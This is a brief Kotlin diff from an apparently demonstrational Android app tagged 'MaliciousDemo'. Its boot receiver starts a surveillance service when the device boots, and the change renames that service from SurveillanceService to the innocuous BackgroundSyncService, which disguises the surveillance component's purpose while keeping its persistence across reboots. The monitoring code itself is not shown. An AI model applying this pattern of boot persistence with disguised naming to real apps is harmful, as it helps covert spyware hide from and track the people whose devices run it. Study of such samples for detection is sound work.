@@ -15,7 +15,7 @@ class BootReceiver : BroadcastReceiver() {
         if (intent.action == Intent.ACTION_BOOT_COMPLETED) {
             Log.d("MaliciousDemo", "Device booted, starting surveillance service")
             
-            val serviceIntent = Intent(context, SurveillanceService::class.java)
+            val serviceIntent = Intent(context, BackgroundSyncService::class.java)
             
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 context.startForegroundService(serviceIntent)
